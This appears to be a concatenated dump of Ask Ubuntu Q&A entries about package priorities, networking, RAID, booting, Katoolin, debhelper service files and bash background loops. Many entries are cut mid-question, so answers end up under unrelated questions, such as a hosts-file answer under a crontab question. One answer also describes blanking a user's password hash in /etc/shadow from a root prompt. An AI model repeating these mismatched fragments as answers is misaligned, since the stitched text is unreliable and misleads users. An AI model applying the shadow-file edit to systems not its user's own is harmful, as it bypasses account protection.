\"owncloud.conf\". To save the changes to the file use Ctrl+X then you will be prompted for save changes. Pressing y or n does the job.\nKeyboard shortcuts for nano: Keyboard short-cuts\nMore details about nano :  Manpage for nano\nTo open an existing file: \nnano /path/to/file/filename\nAbout owncloud: It is suggested to upgrade to newer version.\n", "Q: libreoffice and ubuntu 14.04 gui problem I have some problem with libreoffice window resize: screen after window resized\nI already tried with version 4.2 and 5.0, the result was the same.

Suppose a package A was initially installed from repository X and later I added repo Y which also has package A. Which repo will be chosen to update the package? Also if I completely remove this package and try to reinstall then which repo would be preferred by Ubuntu to install the package?\n\nA: By default, the package with the highest version number is installed, regardless of which repository it comes from, unless its version number is lower than the currently installed version of the package (this can happen, for example, if you downloaded a higher version as a .deb package and installed it manually). In the very unlikely case that several repositories have the same (highest) version of a package, the package is installed from the one which appears first in the sources.list file.\nYou can change this, however, by assigning a different priority to some packages based on various criteria. The previous paragraph is true with the default settings because by default all packages have priority 500. If different versions of the package have different priorities, however, the version with the highest priority will be installed, and version numbers will only be used as tie-breakers if several versions have the same (highest) priority. Also, if the highest-priority package has priority at least 1000, it will be installed even if its version is lower than the version currently installed.\nPriorities are managed in /etc/apt/preferences and documented in man apt_preferences. See my answer here for an example of how they can be used.\n", "Q: Unity Desktop incomplete when launching manually using 'startx $(which unity)' This is a follow-up question to 15.10: 'startx $(which unity)' fails when booting to console.\nI finally managed to load the Unity Desktop after having booted into text-mode. But the desktop I get is still not usable. It has a screen resolution of 800x600 and all indicators are missing, the panel is completely empty. Also I can't change the settings (e.g. the display resolution), which results in an error like this:\n\nWhat is happening here? When I boot directly into the graphical desktop environment, there are zero problems. What am I missing when booting to console and starting the desktop manually?\nI currently do that by executing startx $(which unity).\nPlease help me to be able to successfully start the Unity desktop manually from a pure console.\n\nA: You could follow the chain of targets from the point you stopped at and manually load the graphical target as if you didn't stop at the multi-user target at all:\nsudo systemctl start graphical.target\n\nThat will handle everything correctly.\nBut bear in mind that this will start LightDM, which will in turn start Unity upon login, and not Unity directly.\n\nTo leave the graphical desktop again in favor of the console, load the multi-user.target:\nsudo chvt 1 && sudo systemctl start multi-user.target\n\nThe sudo chvt 1 additionally switches back from TTY7 (GUI) to TTY1 (console), because otherwise you would stay on a black screen.\n", "Q: Setting up Static IP Address for Wireless in Ubuntu 14.04 I've attempted to set up a static ip address for my home computer (Ubuntu 14.04 LTS), and have followed a few online instructions to no avail. \nmy interfaces file was :\nauto l0\niface lo inet loopback\n\nallow-hotplug wlan0\niface wlan0 inet static\naddress 192.168.1.151\nnetmask 255.255.255.0\ngateway 192.168.1.1\ndns-nameservers 8.8.8.8\n\nwhen I reboot the machine and type ifconfig in the terminal my wlan0 ipv4 was successfully changed to 192.168.1.151 but there is no wireless connection detected.\ni did the same process with an other linux(debian) machine and it's works fine.\nthank you for your help !\n\nA: The issue with Wireless Networks is that they are not managed correctly by /etc/network/interfaces unless you configure all the WPA2 items.  This poses a problem - it will always try and configure itself then for that Wireless Network, and then you won't have a working wifi if you need to do another network, until you reconfigure the item in /etc/network/interfaces, and then reboot or restart the wifi card.\nThe correct way to handle Wireless Networks is to use Network Manager, on a default Ubuntu installation, and then have all the configuration done in the network profile that is stored inside Network Manager.\nIn a typical setup of Ubuntu 14.04, you will have to configure Network Manager to connect to a wireless network.  Inside Network Manager, it will have different connection profiles for each Wireless network.  Start by connecting to the network as you normally would - this will then give you a dynamically-assigned Wireless address, and create the profile.\nClick the network manager icon in the indicator bar.  Hit \"Edit Connections\", and select the network you want to edit.  Then hit \"Edit\"; this type of screen shows up:\n\nYou can then go to the IPv4 tab, and hit \"Manual\".  In the box for IP addresses, network data, etc. you will then put your configuration items there, such that 192.168.1.151 is the address, 24 is the NetMask you enter (you can also put 255.255.255.0 if you want, but 24 is identified the same way), and 192.168.1.1 is the gateway.\nAnother box is for DNS servers - there you would put 8.8.8.8.\nIt'd look something like this when you're done:\n\nHit \"Save\".  Then, tell Network Manager to disconnect and then connect to the network again.  You then have static-IP addressing for that wireless network.\nYou can also configure different settings for different Wireless networks in this way, if multiple networks need different static IP addresses or network settings set on your device.\n", "Q: Install Intel AC 8260 wireless drivers offline As my laptop does not have Ethernet port, to set up wireless, I need to install drivers offline.\nMy Ubuntu version is 14.04.3, and kernel version is 3.19.0-25-generic. \nOutput of the command:\n lspci -knn | grep Net -A2: \nis:\n 01:00.0 Network controller [0280]: Intel Corporation Wireless 8260 [8086:24f3] (rev 3a)\n    Subsystem: Intel Corporation Dual Band Wireless-AC 8260 [8086:0010] \nSince here:\nhttp://ubuntuforums.org/showthread.php?t=2305426\nit is suggested to try following these steps: \nIntel wireless 8260 - unclaimed network\nI tried, but without any success.\nNow I am not sure what to try next.

So, What to do after 9 months? will my OS become useless after 9 months?\n\nA: Your system will remain usable after 9 months, of course, but it will no longer receive bug fixes and security updates, which could leave it vulnerable to security attacks.

Is there any way to do that? I tried using Katoolin, but that broke my Ubuntu. Is there another way to do this safely without breaking Ubuntu?\n\nA: Updates\nThe LionSec Katoolin GitHub webpage clearly warns Katoolin users to be careful when updating software.\n\nBefore updating your system, please remove all Kali-linux repositories to avoid any kind of problem.\n\n\nAll kinds of problems can occur if you don't do this.\nSoftware installation\nKatoolin is a nice package management tool, however because Katoolin is a package management tool, problems can come in groups of packages instead of one package at a time, especially if you try to grab all the Kali linux tools at the same time. Many of the tools in Katoolin are otherwise only available as .tar.gz archives, and in order to install them, you would have to track them down and compile them one by one. Before you compile a .tar.gz, you should check whether the executable is provided by another package from the default Ubuntu repositories.\nIn Katoolin Kali linux tools come from multiple repositories and in these repositories there are more than 300 tools. Some of these tools are duplicates of tools that can be installed from the default Ubuntu repositories, and sometimes they are more up-to-date versions having different dependencies than the same tools from the default Ubuntu repositories. Some tools in Katoolin are packaged as standalone tools, whereas in Ubuntu the same tool is bundled into a larger package that contains additional software. When you add a new Kali repository apt doesn't always know if you are adding conflicting packages to your system's list of software, but you'll find out about it when you try to install the packages. Katoolin is a cross platform package management tool, and the same package that installs perfectly on another operating system can cause errors when trying to install it in Ubuntu.\nIn Katoolin tools can be installed in three different hierarchical levels of grouping.\n\n*\n\n*Install all Kali linux tools.\n\n*Select a category and install all Kali linux tools in the selected category.\n\n*Select a single tool and install it.\n\nDon't be reckless. In order to install Kali linux tools in a safer way, don't install any tools that you don't need. The more Kali repositories that you add to your software sources and the more Kali linux tools that you install, the higher the probability is of breaking something.\n", "Q: Removing Prior Crontabs I think I have competing cronjobs.

Now how I can get that address or I make mistake and I have to set an address and then use it? In second case how can I do that?\n\nA: \nStep Six — Set Up Local Hosts File (Optional)\nIf you haven't been using actual domain names that you own to test\n  this procedure and have been using some example domains instead, you\n  can at least test the functionality of this process by temporarily\n  modifying the hosts file on your local computer.\nThis will intercept any requests for the domains that you configured\n  and point them to your VPS server, just as the DNS system would do if\n  you were using registered domains. This will only work from your\n  computer though, and is simply useful for testing purposes.\nMake sure you are operating on your local computer for these steps and\n  not your VPS server. You will need to know the computer's\n  administrative password or otherwise be a member of the administrative\n  group.\nIf you are on a Mac or Linux computer, edit your local file with\n  administrative privileges by typing:\nsudo nano /etc/hosts\n\n\nHe is clearly talking about a second machine not the VPS server. Because if those domains are not yours, you can't have a public DNS to point them to your VPS server. So you can go the other way and trick your second machine using hosts files.\n\n\n*\n\n*In your VPS server, run ifconfig to get its public IP.\n\n*In you second machine, edit /etc/hosts file and add the below line with that IP:\nvps-server-ip example.com\nvps-server-ip test.com\n\n\nA: I also had this doubt while following the instructions on this page. I used my internal IP address and the ServerName that I set on the .conf file created and it worked.\nIn my case before I added this to /etc/hosts the browser displayed \"DNS address could not be found.\" as my ServerName domain didn't existed. In your case, example.com is an real domain. That page with \"This domain is established to be used for illustrative...\" is the actual page. It is not a message related to something you did while configuring your Apache. You can access this page from any device.\nYou can find your IP by right-clicking on the network icon and selecting Connection Information. The item IP Address on IPv4 shows you your internal IP address.\n\nA: I also came across the problem you had. I've done a simple change and I could get the expected result \"Success!  The example.com virtual host is working!\".\ntype\nsudo nano /etc/hosts\" \n\nin your terminal. \nYou have to enter your IP address instead of 111.111.111.111\nTo get the IP address type\nifconfig\n\nin terminal.\nThere you can see \ninet addr:127.0.0.1  in lo section.\n\n", "Q: Gparted not installable in Ubuntu 15.10 due to unmet dependencies Gparted worked fine in Ubuntu 14.04 and 14.10 (I'm not sure about 15.04)) but I'm having trouble installing it in 15.10 from the software center.

What are those letters after the version on daisy (instead of generic)?\nAlso, this may be totally related, but in using common unix tools like ps I get different outputs on each machine.

Does the different kernel version affect the utilities installed on it?\nIs it possible to update the kernel on daisy?  Would it change anything?\n\nA: OVH puts a custom kernel on their Ubuntu servers (source). Here is how to install the generic one. I'm not sure what all the letters in the name mean, but probably, \"grs\" indicates support for Global Resource Serialization, \"ipv6\" indicates support for IPv6, and \"64\" indicates 64-bit.\nAs for why ps -ef is giving you different outputs, I'm not sure exactly, but it could be that OVH puts a non-standard version on their servers.\n", "Q: How can I get eth0 interface I try to get MATLAB running in Kubutu but there seems to be a problem with the network interfaces.

It doesn't seem to matter what I run as guest, and it didn't happen before with these same VMs so it's not that they all just don't like it, the problem probably is with VirtualBox. I have tried running Ubuntu GNOME 15.10, Ubuntu 16.04, and Ubuntu GNOME 16.04.\nInformation Update:\nNeither the left, nor the right CTRL keys actually do anything, they don't even seem to interact with Virtual Box because pressing the right one should change something in it.\nI have tried installing the Guest Additions CD in my VMs, but it makes no difference to my problem.\n\nOS Information:\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 15.10\nRelease:    15.10\nCodename:   wily\nFlavour: GNOME\nGNOME Version: 3.18\n\nPackage Information:\nVersion: 5.0.14 r105127\n\n\nA: I have figured out the problem!\nThe problem was that for some reason when one has the Show location of pointer option enabled in the gnome-tweak-tool, as this is assigned to CTRL, for some reason this prevents programs from capturing this key.

Since they are \"saved to clipboard\", the contents must be stored somewhere.\nAre they stored in a file?\n\nA: What clipboard? There are some apps/tools that can be used to store clipboard contents to a file on disk, but the core clipboard feature in X11 simply keeps what is in the clipboard, in memory. It is not stored in a file on disk.\n\nA: On my Xubuntu system, I have Clipman installed, and I find the clipboard contents at /home/YourUsername/.cache/xfce4/clipman/textsrc. Yes, that's a cache file, but can be saved even after rebooting my system. It's not a MEMORY cache, which is cleared on, say, reboot.\nHowever, if you quit Clipman and then restart, the data will be lost. So, if you want your items to be saved no matter what, you can open the file with, say, mousepad, copy the contents, create a new file named ClipboardHistory*date*.txt in, say, your documents folder, paste into it and save before closing.\nYou can restore the contents by the reverse process. You can also edit the contents this way if you want (you may want to delete the clipboard entry containing all the text if it duplicates!)\nOn other environments the idea is probably the same, the names of the programs will be different, however.\n\nA: There are 3 clipboards usually available to users in Linux.\nThese clipboards are called \"Selections\"\nThere is:\n\n*\n\n*PRIMARY - This is normally used for middle mouse button = copy/paste\n\n*SECONDARY - Normally not used by much, but it exists. Usually as an in app specific copy and paste.\n\n*CLIPBOARD - Usually Ctrl+c and Ctrl+v style copy and paste.\n\nAll of them are stored, by default in memory of the controlling application (usually Xorg, but not always). And every child application has access to it.\nClipboard monitors and managers exist that can monitor the clipboards and store their contents in a file, or more commonly, let you review your clipboard history.\n", "Q: How can I immediately disable all emails using postfix?

I know that Windows machines cannot recognize Linux software raids, but I can't find out of Linux machines can, and the steps I should look at in case something happens to my server hardware.\nWhat steps do I take to move a RAID to a new system? Is it as simple as installing the two disks of the array and also mdadm?\n\nA: I actually had to do this recently. psusi is correct, they do transfer, although simply installing mdadm did not work on my particular installation.\nI had to do the following:\n#install the raid manager\nsudo apt-get install mdadm\n#scan for the old raid disks \nsudo mdadm --assemble --scan\n#all turn up present, but both appear as device md0\n#move the disks that don't appear in scan to md1\nsudo mdadm --assemble /dev/md1 /dev/sdf1 /dev/sdd1\n\nI also updated my mdadm.conf to reflect the change in the second array moving from md0 to md1.\nYour mileage may vary.\n\nA: Assuming you already have mdadm installed on the new system ( if not, install it with sudo apt-get install mdadm ), it should be activated automatically if you plug in all of the drives, typically as /dev/md127 or the next lower number available.\n", "Q: How can i remove Ubuntu?

I have an 8 GB USB 2.0 flash drive that I used to boot off of using the Universal USB Installer software from pendrivelinux.com. The software takes the linux ISO and automatically formats the USB for booting so all I have to do is reboot and spam F11 to choose to boot off of the USB.\nThis is where my problem occurs. After booting off of the USB, code (stuff that I don't understand) goes scrawling down the screen. After this, the Ubuntu logo appears and then after a few seconds the screen goes black and an error message appears. After booting from the USB the Ubuntu logo appears and then this screen comes up.\nMy laptop currently has SAMSUNG 850 EVO M.2 SATA 6Gb/s SSD (120GB x 2) in RAID 0 and a 1 TB 7200RPM SATA300 Hard Drive. There is still plenty of space left in both of these for the Linux OS so I'm not sure what the problem could be.\nI hope I gave enough information, but if I left anything out let me know!\n\nA: for sure that is not a problem of available space. Seems that for some reason your installation image is not correct. The message on the bottom says, that installer cannot find /dev/sdc device containing installation image. \nYou mentioned about 2 SDDs in RAID mode. My guess is following: hardware RAID under windows is recognized as single drive (which is normal). So this is virtually mapped to /dev/sda. Under linux - those devices can be seen separately. So you'll get /dev/sda and /dev/sdb. Then, your HDD will be /dev/sdc (instead of expected USB drive). But this is only my guess.\nNow, to try solve your problem - first I'd change Universal USB Installer to something else. Maybe you're more lucky then. Kubuntu (which is the same OS family) is suggesting UNetbootin (https://unetbootin.github.io/) - you may give it a try before digging into details of your hardware setup - maybe it will just work.\nPlease drop some info if you try this.\nGood luck.\n", "Q: Cannot Install Mono (Depends Errors) I cannot install Mono.

It is not feasible to add/call that function on all the websites and each & every page manually. \nIs there a way in nginx where I can define which PHP file/function it should execute before serving the request to a user?\n\nA: NGINX does not have this capacity as part of stock NGINX functions.  This is something that needs to happen at the PHP level - which is not nginx - if it has to run for every request it has to be done at PHP or the PHP application.\nYou may be able to do this with some type of Lua code done by the third-party Lua module (which must be manually compiled in, unless you use nginx-extras) that passes a request before processing to PHP backend but that will be executed separately from the sites and their web app items, quite possibly earlier than you want it to (I am not an expert in the Lua module and its functionality though).\nThis is NOT however a typical use case so such preprocessing of requests is not part of the design spec for nginx and possibly not easy to accomplish via the Lua module either.\n", "Q: I installed Ubuntu 14.04.3 LTS, but I can't boot into it. How can I fix this? I've installed Ubuntu 14.04.3 LTS from a USB drive, on a PC running Windows 8.1. But when I turn on my PC, I'm not presented with an option to choose to boot either Windows or Ubuntu. Instead, I'm taken straight to Windows. I've reinstalled Ubuntu (from the same USB drive), and nothing's changed. Moreover, Ubuntu doesn't appear in my list of programs in the Windows control panel. How can I boot into Ubuntu?\nSomeone suggested I boot the USB drive and type the commands:\nsudo fdisk -l\nsudo grub-install /dev/\nHere's the output of these commands:\nOutput of sudo commands\n\nA: I have something similar. I never see grub. However, if I get the BIOS boot menu, I can choose either Windows or Linux.\nYou may also need to disable safeboot in the BIOS.\nWhen your machine first comes on it should tell you which key to press to get BIOS settings. F10, F12, del or something.\n\nA: I strongly suspect, but do not know for certain, that you've installed Ubuntu in BIOS/CSM/legacy mode, and that you've got an EFI/UEFI-mode Windows installation. Such dual-mode installations always complicate matters, and should be avoided. Unfortunately, avoiding them takes some general EFI know-how that is, as yet, not as common as it needs to be.\nAnother possibility is that your firmware is broken and it's either \"forgetting\" your boot settings or it's ignoring them. In this case, the best solution is to replace the broken computer with one that works; however, most people end up using an ugly workaround, like renaming their boot loaders. The Boot Repair utility has an option to do this on its Advanced menu.\nTo know which of these is the case, you should run the Boot Info Script. This will generate a file called RESULTS.txt. Post it to a pastebin site and post the URL to your document here.\nI strongly recommend that you read as many of the following as you can manage; they'll give you the information on EFI-mode booting and dual-booting that you need to handle the situation intelligently:\n\n\n*\n\n*Adam Williamson's blog entry on how EFI works -- This page describes the theory behind EFI-mode booting.\n\n*A question and answers on the differences between BIOS and EFI booting on Superuser.com -- This provides the basics of the preceding, but is more concise.\n\n*My page on installing Linux on EFI systems -- This page is a more practical introduction to EFI-mode booting than the preceding two.\n\n*My page on the CSM -- This page covers the CSM, including when it's useful and when it's not.\n\n*The Ubuntu community wiki entry on UEFI -- This page is a bit disjointed, but is the most Ubuntu-specific introduction to EFI and its issues.\n\n\nA: There is a section of your HHD that is the boot area. The information in there will dictate the boot steps. If you installed Ubuntu along with Windows then you need to install GRUB from ubuntu to the boot manager. That will handle our chioce of win or ubuntu.\nYou will need to boot the live disk and either fully reinstall or install grub from there. Open a terminal, and type sudo fdisk -l Now, type sudo grub-install /dev/\n", "Q: change name of a service file when creating a package How can I create a service with a name different from the name of the package?\nI'm preparing a package that provides also a service file (systemd config) that should have a name different from the package.\nCurrently I added a file debian/pkg_name.service and it works but the name does not reflect the service started. \nI already noticed that dh_installinit has a --name option but tha man page lists\n\ndebian/package.name.init, debian/package.name.default and\n  debian/package.name.upstart instead of the usual debian/package.init,\n             debian/package.default and debian/package.upstart\n\nbut not package.service. Moreover I haven't really understood where I should place the line. Currently my debian/rules has\n%:\n        dh  $@ --with bash-completion --with systemd\n\n\nA: At last I solved it with the following configuration:\n\n\n*\n\n*package name is  thunder-buildout-prod\n\n*debian/oooctl.service as in question\n\n*in debian/rules:\n\n%:\n  dh  $@ --with bash-completion --with systemd --with python2\n\noverride_dh_systemd_enable:\n  dh_systemd_enable -p thunder-buildout-prod debian/oooctl.service\n\noverride_dh_systemd_start:\n  dh_systemd_start -p thunder-buildout-prod debian/oooctl.service\n\n\nAs a last note. Having a script in /etc/init.d/oooctl (note: same name as the service) that sources  /lib/lsb/init-functions, this is enought to make it just work as a call to systemctl start/stop/status oooctl.service ignoring the rest of the script\n\nA: According to the dh_systemd_enable manual https://manpages.debian.org/testing/debhelper/dh_systemd_enable.1.en.html:\n--name=name\n    Install the service file as name.service instead of the default \n    filename, which is the package.service. When this parameter is \n    used, dh_systemd_enable looks for and installs files named \n    debian/package.name.service instead of the usual debian/package.service.\n\nI found that you also need to pass the name to dh_installinit. For example, if your package was amed \"mytool\" but you want your service file to be mytoolsrv.service instead of mytool.service, you would create the file debian/tool.toolsrv.service and put the following in you debian/rules file:\n#!/usr/bin/make -f\n\n%:\n    dh $@\n\noverride_dh_systemd_enable:\n    dh_systemd_enable --name=mytoolsrv\n\noverride_dh_installinit:\n    dh_installinit --name=mytoolsrv\n\nTested with debhelper compatibility level 10.\n", "Q: cannot log on to Ubuntu 14.04 I have just finished loading on Ubuntu 14.03 now after putting in my password the screen goes blank then goes back to the password logon page\n\nA: Do Ctrl + Alt + F1 to go to prompt.Login with your username and password.Then do\nsudo chmod -R ug+rwx /home/[username]\nThen do  Ctrl + Alt + F7 to login \n", "Q: How do I search for `!` (exclamation mark) in a manual page?

I had to try something different because:\n\n*\n\n*My USB keyboard did not work at the root prompt ⋯ probably hardware either keyboard or mainboard. To fix I used an old PS/2 keyboard (the little round plug) and use that.\n\n\n*When I used passwd username to change my password, it failed because of a bad token or such. This called for drastic measures.\nThe Drastic Measures\nThis is a very dangerous thing to do! Jorge's method should be used; only do this in case that method doesn't work.\nDo this at your own risk. It did work for me on my 11.10 system.\nThe idea is to set the user's password to blank (or null) - this allows you to just press Enter at the Password: prompt.\nStill at the root prompt from Jorge's method, first remount the root file system as read-write by using this command:\nmount -o remount,rw /\n\n\n*\n\n*Now you are a super-user on this system. Tread lightly.\nThen edit the password shadow file to remove the encrypted password for your username. Type in:\nnano -B /etc/shadow\n\nThe nano editor will display the contents of the file. Each line will have the form name:⋯:⋯:⋯… where ⋯ is a string or null (empty). One of the lines will start with your username. The first ⋯ after your username is your encrypted password. As an example:\nusername:$1$amFeNcjp$PprjCKEVk3UtzKwWfEMOY0:14920:0:99999:7:::\n\nwhere $1$amFeNcjp$PprjCKEVk3UtzKwWfEMOY0 is the encrypted password.\nCarefully delete the encrypted password leaving the all the \":\"s, so it looks like this:\nusername::14920:0:99999:7:::\n\nThen type Ctrl+O, press the Enter key to save, then Ctrl+X to close nano.\nReboot and you will have an empty (or null) password.  Be sure to use passwd username in a terminal to set  or reset your user password.\nSource for PS/2 workaround was here.\nSources for the drastic measures were here and here.\nNote on nano ― the -B option makes a backup of the original edited file, same name with a \"~\" appended.\n", "Q: How can I install Ubuntu 14 LTS on my Dell 13\" 7000 series 2-in-1 laptop? I've read a number of guides attempting to explain how to dual boot Ubuntu with Windows 10, but the problem I keep running into is that can't I can't even get the Ubuntu installer to start. I continually get an error: oxc000007b. I've tried running the WUBI installer, tried booting with the Shift+Restart command and booting from the USB device with Ubuntu installed on it, tried mounting the ISO through Windows 10's built in tool; tried changing all the UEFI settings to Legacy to normal, to secure boot enabled to disabled, etc, etc etc. I simply can't get it to boot up with the Ubuntu installer. \nAs implied, I'm on Windows 10, and my computer has UEFI. I miss the days of simple BIOSs where you could just run WUBI and magic would happen. Windows 10 is just so slow. I need Linux!!\nEdit: I used the Unetbootin tool. I am pretty sure all the USB drives I used were FAT32; I tried a number of different drives as well.\n\nA: WUBI is deprecated even on BIOS-based computers and is 100% useless on a dual-boot with an EFI-mode Windows installation, so don't waste any more time on it.\nWhen doing a dual-boot installation in EFI mode, you should NOT enable the Compatibility Support Module (CSM; aka \"legacy boot support\" or a similar phrase). Doing so is much more likely to create problems than to solve them. At best, it will solve an early problem only to create bigger problems further down the line. For more on this subject, see my Web page on the CSM.\nI'm unfamiliar with the 0xc000007b error you report, but my guess is that your Linux installation medium is not prepared correctly. Tools used to create USB drives are not created equal. Personally, I generally use dd to copy images to USB flash drives, but that's not convenient in Windows. In Windows, the Rufus program seems to have the best reputation, although Unetbootin also usually works. Contrary to dodo_master's recommendation, I see a lot of problem reports about Universal USB Installer (aka PenDriveLinux and one or two other names), at least for EFI-mode installs. Unfortunately, what works well varies from one distribution and computer to another, so I can't point you at something that's 100% guaranteed to work; you may need to try two or three tools before you find one that works on your computer.\n\nA: the error oxc000007b is because you have to format your usb with fat32. \nthen use universal usb installer to make a bootable ubuntu usb\nand as you implied that you are not happy with win 10 and you missing the simple bios days then you should delete win 10 and go open source as i did.

However, I can only quickly launch the file by typing ./filename.tcl in the terminal. I would like to know, is there a way to run the same script without typing the ./ before the filename?\n\nA: If you leave out the path to the file then your shell is going to look for the command via the $PATH variable. The \".\" is the current directory, which provides a path to the file. Your options are:\nPut the file inside a subdirectory like bin:\n$ bin/filename.tcl\n\nThis is most likely not what you want. What you might want is to alter your $PATH to include the current directory.\n$ PATH=$PATH:. filename.tcl\n\nIt's most likely not wise to export the current directory to the $PATH variable as it may cause some unexpected behavior. It may be better to export the full path to your bin directory. So for example if you were working at $HOME/my/code/bin/filename.tcl then you could add this to your .bashrc (or whatever shell config file you use)\nexport PATH=\"$PATH:$HOME/my/code/bin\"\n\nThen you should be able to run\nfilename.tcl\n\nWithout specifying the path to the directory.\n", "Q: Multiple connections per ip I am running Ubuntu with a webserver (Nginx).

I have been working on a script for my father that manages several tasks through a script with many functions that chain together (organization purposes). This script relies entirely on zenity for all user interaction (my father is really tech illiterate {Age 60+}).\nThe issue I'm having is that once I call the function transprog it won't exit the loop even after the variable that the while loop relies on is changed outside of the function. \nThe loop is called here:\ncopystat=\"1\"\ntransprog & cp -rf \"$netlocdirFIN/\" \"$transdir2/\" # \"transprog\" is called here\ncopystat=\"0\"\nsleep 1\nret=\"$?\"\necho \"$ret\"\ntransnew #calls next step/function\n\nAnd this is the transprog function:\ntransprog ()\n{\ni2=\"Im Working On It!\"\n\n(\nwhile [ $copystat = 1 ]; do\n# =================================================================\necho \"25\"\necho \"# ^_^ $i2\" ; sleep 1\n\n# =================================================================\necho \"50\"\necho \"# ^-^ $i2\" ; sleep 1\n\n# =================================================================\necho \"75\"\necho \"# ^_^ $i2\" ; sleep 1\n\n\n# =================================================================\necho \"99\"\necho \"# ^-^ $i2\" ; sleep 1\n\ndone\necho \"# Your files are DONE TRANSFERING!\" ; sleep 1\necho \"100\"\n) |\nzenity --progress \\\n  --title=\"File Transfer In Progress\" \\\n  --text=\"# Im Getting Warmed Up\" \\\n  --percentage=0 \\\n  --auto-close \\\n  --auto-kill\n}\n\nOnce the copy is done the script continues on: the zenity progress bar is in the background ticking away and it really confuses him.\nHow can I tell the backgrounded function to exit?\n(zenity uses the echo values of 25,50,75 and 99 to change the \"complete-ness\" of the progress bar. and the echo \"# (whatever)\" to change the text.)\nall it is is something to tell him \"Hey Duffus im bussy copying stuff dont shut me off\"\ni have tried Guss's solution: (seperated script for test purposes)\n#!/bin/bash\n\ntranstest ()\n{\n\ni2=\"Im Working On It!\"\n\nvar=0\ntrap 'var=1' 2\n\n(\nwhile [ \"$var\" = 0 ]; do\n# =================================================================\necho \"25\"\necho \"# ^_^ $i2\" ; sleep 1\n\n# =================================================================\necho \"50\"\necho \"# ^-^ $i2\" ; sleep 1\n\n# =================================================================\necho \"75\"\necho \"# ^_^ $i2\" ; sleep 1\n\n# =================================================================\necho \"99\"\necho \"# ^-^ $i2\" ; sleep 1\n\n\ndone\necho \"# Your files are DONE TRANSFERING!\" ; sleep 1\necho \"100\"\n) |\nzenity --progress \\\n  --title=\"File Transfer In Progress\" \\\n  --text=\"# Im Getting Warmed Up\" \\\n  --percentage=0 \\\n  --auto-close \\\n  --auto-kill\n}\n\ntranstest &\npid=$!\necho \"$pid\"\nsleep 20 #code to copy? or just for this test?\necho \"Killing Child: $pid\"\nkill -2 \"$pid\"\necho \"wait\"\nwait\nexit\n\ni see result from echo \"wait\" and it still keeps looping.\n\nA: The problem you have is caused by the subshell spawned when you call transprog to run in the background (what the & symbol does). You have to understand that your bash script is not a program but a shell script which behaves according to the shell rules - a shell can only run one process at a time and wait for it to terminate. \nThe \"jobs system\" allows you to run another process and not wait for it, but when that process is a function defined in bash, bash will spawn a \"sub shell\" that \"copies\" all the variables and functions of the original shell, and track that as a job. The copied shell isn't aware of changes made it its parent shell - because it is not referencing the parent shell variables directly - just a copy of them.\nWhat you need to do for your background loop, is to use an Inter Process Communication mechanism (IPC) to let the parent shell notify the loop in the subshell to abort. For such a simple signaling, usually a \"POSIX Signal\" is appropriate.\nThe most appropriate signal to use is the \"interrupt signal\", SIGINT (signal number 2), which is what is produced when you press CTRL+C and that normally stops your script. But we can catch this signal and update a local variant using the trap built-in command.\nHere is a simple example:\n#!/bin/bash\n\nfunction test() {\n  var=0\n  trap 'var=1' 2\n  while [ \"$var\" = 0 ]; do\n    sleep 3\n    echo 'still sleeping'\n  done\n  echo \"done sleeping\"\n}\n\ntest &\npid=$!\necho $pid;\nsleep 5\necho \"Killing $pid\"\nkill -2 \"$pid\"\nwait\n\nThis will output:\n$ ./test.sh \n8359\nstill sleeping\nKilling 8359\nstill sleeping\ndone sleeping\n\nWhat happens here is that after 5 seconds there loop has completed one round and is now sleeping on the second round when the parent uses the kill builtin to signal the subshell. The subshell's sleep is interrupted, it receives the signal and updates the variable, then resumes the sleep When the loop awakens, it outputs the text then goes back and sees that the var has changed and leaves the loop.\nI use the wait builtin in the parent just to make sure the parent process doesn't exit before the subshell. It essentially \"waits\" for the subshell to end.\n[UPDATE]\nAfter looking at the OP a bit more, there's a few more subshells going on, and I don't want to fight that - subshells (in addition to functions) is a good way to manage complexity in a script - but that does make finding the correct PID to send the signal to a bit difficult.\nInstead we can use another IPC mechanism called a \"shared memory segment\". This allows a process to allocate a batch of memory, assign it a name, and let multiple processes access the same memory (it is covered in the IPC document linked above, in greater detail). While in Bash we can't directly address that feature (unlike what a C program, for example, can do), we can use a Linux mechanism that exposes the shared memory IPC to any program through the /dev/shm device category. So the OP script might look something like this:\n#!/bin/bash\n\ntranstest () {\n  local sync=\"$1\"\n  i2=\"Im Working On It!\"\n  var=0\n  (\n    while [ -z \"$(cat $sync)\" ]; do sleep 1; done\n    echo \"# Your files are DONE TRANSFERING!\"\n    sleep 1\n    echo \"100\"\n  ) | zenity --progress --title=\"File Transfer In Progress\" --text=\"# Im Getting Warmed Up\" \\\n    --percentage=0 --pulsate --auto-close --auto-kill\n}\n\nsync=/dev/shm/syntest-$$ # allocate a shared memory segment name for this process\necho '' > $sync # init the shm\ntranstest $sync &\nsleep 20\necho \"Signaling done\"\necho \"done\" > $sync\necho \"waiting\"\nwait\n# remove the shm segment. While not actually necessary (it will clear\n# when you reboot), I like to keep a clean system\nrm $sync \nexit\n\nBasically, we treat the SHM segment as a file, and just store some data there. The loop keeps reading the \"file\" and when there is content there it breaks out.\nOne question remains, why not just allocate a temp file (using mktemp) and use that for syncing? Well - that would work almost the same! The main difference, and why I prefer SHM for that kind of thing, is that its not really a file and isn't subject the file system IO operations, disk errors and the likes, and if I fail to clean it up, it will be gone the next time the system boots.\n\nA: You have changed the value of conditional variable (copystat) outside the while loop (running in a subshell), which is outside the scope of the while loop. Unless you have some condition inside the loop itself to trigger the loop exit condition or use an IPC, the loop will continue forever.\nSo the solution is to incorporate the copying or any other conditional logic within the while loop itself to trigger the exit Or you can think about changing the design altogether to make it more robust in such situations Or use an IPC mentioned here.\n", "Q: Three Drives.

